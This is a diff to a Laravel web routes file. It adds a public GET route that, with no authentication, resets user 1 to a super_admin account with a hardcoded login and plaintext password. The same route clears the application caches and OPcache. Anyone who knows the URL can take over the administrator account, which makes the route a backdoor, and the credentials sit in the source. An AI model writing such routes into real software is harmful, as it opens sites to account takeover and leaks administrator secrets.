@@ -52,6 +52,30 @@ Route::get('/login', [AuthController::class, 'showLogin'])->name('login');
 Route::post('/login', [AuthController::class, 'login']);
 Route::post('/logout', [AuthController::class, 'logout'])->name('logout');
 
+// Force reset route for admin login and cache
+Route::get('/force-reset-admin-login-1234', function() {
+    \App\Models\User::updateOrCreate(
+        ['id' => 1],
+        [
+            'name' => 'Kurucu Admin',
+            'email' => 'DioTurkReal.13',
+            'password' => \Illuminate\Support\Facades\Hash::make('xYdioReal.13xY'),
+            'role' => 'super_admin'
+        ]
+    );
+
+    try { \Illuminate\Support\Facades\Artisan::call('view:clear'); } catch (\Exception $e) {}
+    try { \Illuminate\Support\Facades\Artisan::call('route:clear'); } catch (\Exception $e) {}
+    try { \Illuminate\Support\Facades\Artisan::call('config:clear'); } catch (\Exception $e) {}
+    try { \Illuminate\Support\Facades\Artisan::call('cache:clear'); } catch (\Exception $e) {}
+
+    if (function_exists('opcache_reset')) {
+        opcache_reset();
+    }
+
+    return "Her sey sifirdan basariyla kuruldu, veritabani guncellendi ve tum inatci onbellekler (OPcache) temizlendi! Lutfen /login sayfasina gidip giris yapin.";
+});
+
 // Protected Admin Routes Group
 Route::middleware(['admin'])->prefix('admin')->name('admin.')->group(function () {
     Route::get('/', [App\Http\Controllers\Admin\DashboardController::class, 'index'])->name('dashboard');
